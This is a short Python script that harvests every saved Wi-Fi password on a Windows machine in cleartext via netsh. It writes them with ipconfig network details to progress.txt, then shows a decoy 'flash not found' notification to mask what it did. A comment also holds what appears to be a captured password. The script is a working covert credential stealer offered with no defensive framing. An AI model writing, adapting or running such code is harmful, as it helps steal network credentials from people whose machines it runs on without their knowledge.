"""
This code implements the main functionality of wifipassword.

Author: Adekojo Adeyemi
"""

import subprocess
import re
from winotify import Notification, audio

def make(command):
  execute = subprocess.Popen(command, shell=True,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

  result = execute.stdout.read() + execute.stderr.read()
  result = result.decode()
  return result
command = "netsh wlan show profile"
commande = "ipconfig"
resulte = make(commande)
result = make(command)
value = "All User Profile     :([^\n]*)"
patterns = re.findall(value, result)
with open('progress.txt', 'a') as f:
  for i in patterns:
    ssid = i.strip('\n').strip(' ').strip('\r')
    commands = "netsh wlan show profile name=\""+ str(ssid) +"\" key=clear"
    results = make(commands)
    values = "Key Content            :([^\n]*)"
    patterns = re.findall(values, results)
    password = ''.join(patterns).strip(' ')
    if password == "":
      password = "None\n"
    need = f"{ssid} ==> {password}"
    f.write(need)
  f.write(resulte)
  f.close()

toast = Notification(
  app_id = "Yembot App",
  title="information!!!", 
  msg="flash not found")

toast.show()
# Key Content            : timmycruise666
# with open('password.txt', 'w') as f:
#   f.write('k')
# import wireless

# wire = wireless.Wireless(interface="Wi-Fi")

# print(wire.connect(ssid="Adebayo", password="123456"))